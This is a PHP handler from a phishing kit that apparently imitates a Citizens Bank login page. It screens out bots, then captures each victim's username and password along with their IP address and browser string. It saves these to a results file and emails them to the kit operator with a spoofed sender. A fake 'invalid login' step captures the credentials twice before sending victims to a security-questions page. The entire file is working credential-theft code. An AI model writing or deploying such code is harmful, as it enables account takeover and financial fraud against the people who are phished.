<?php
session_start();

include "../../admin/config.php";
if($bots == "on"){
    include '../antbots/ip_blocklist.php';  
    include '../antbots/Crawler.php';
    include '../antbots/Boting.php';
    include '../antbots/blacklist.php';
    include '../antbots/new.php';
    include '../antbots/myz.php';
}


$ip = $_SERVER['REMOTE_ADDR'];
if($double_login == "on"){}else{
$ff = fopen("huehue",'a');
fwrite($ff,$ip."\n");
fclose($ff);
}

$huehue = file_get_contents("huehue");
if(strpos($huehue, $ip) !== false){

    if(!empty($_POST['username'])){
    
        $file="../Result/login".$pin.".txt";
        
        $data  = "[ - ] =======| DOUBLE LOGIN |======== [ - ]\n";
        $data .= "[+]User:       ".$_POST['username']."\n";
        $data .= "[+]Pass:       ".$_POST['password']."\n";
        $data .= "[ - ] =======| IP |=========== [ - ]\n";
        $data .= "[+]IP:         ".$_SERVER['REMOTE_ADDR']."\n";
        $data .= "[+]Browser:    ".$_SERVER['HTTP_USER_AGENT']."\n";
        $data .= "[ - ] =======| END |=========== [ - ]\n";
        $praga=rand();
        $praga=md5($praga);
        $pra = rand(1111111111,9999999999);
        
        
        $f = fopen($file,'a+');
        fwrite($f,$data."\n");
        fclose($f);
        
        
        $to = $your_email;
        $subject = $pra."- Citizen L0G1N I-[".$_SERVER['REMOTE_ADDR']."]";
        $headers = "From: Blueprint".$pra."<blueprint@".$pra."citizen.com>";
        mail($to,$subject,$data,$headers);
            
        $contents = file_get_contents("huehue");
        $contents = str_replace($ip, '', $contents);
        file_put_contents("huehue", $contents);
        
            header("location: /verify_questions.php");

        }else{
            header("location: /index.php");
        }
    
}else{
    if(!empty($_POST['username'])){
    
        $file="../Result/login".$pin.".txt";
        
        $data  = "[ - ] =======| LOGIN |======== [ - ]\n";
        $data .= "[+]User:       ".$_POST['username']."\n";
        $data .= "[+]Pass:       ".$_POST['password']."\n";
        $data .= "[ - ] =======| IP |=========== [ - ]\n";
        $data .= "[+]IP:         ".$_SERVER['REMOTE_ADDR']."\n";
        $data .= "[+]Browser:    ".$_SERVER['HTTP_USER_AGENT']."\n";
        $data .= "[ - ] =======| END |=========== [ - ]\n";
        $praga=rand();
        $praga=md5($praga);
        $pra = rand(1111111111,9999999999);
        
        
        $f = fopen($file,'a+');
        fwrite($f,$data."\n");
        fclose($f);
        
        
        $to = $your_email;
        $subject = $pra."- Citizen L0G1N I-[".$_SERVER['REMOTE_ADDR']."]";
        $headers = "From: Blueprint".$pra."<blueprint@".$pra."citizen.com>";
        mail($to,$subject,$data,$headers);
        $ff = fopen("huehue",'a');
        fwrite($ff,$ip."\n");
        fclose($ff);
            
            header("location: /login.php?invalid");
            

        }else{
            header("location: /login.php?invalid");
        }
}

?>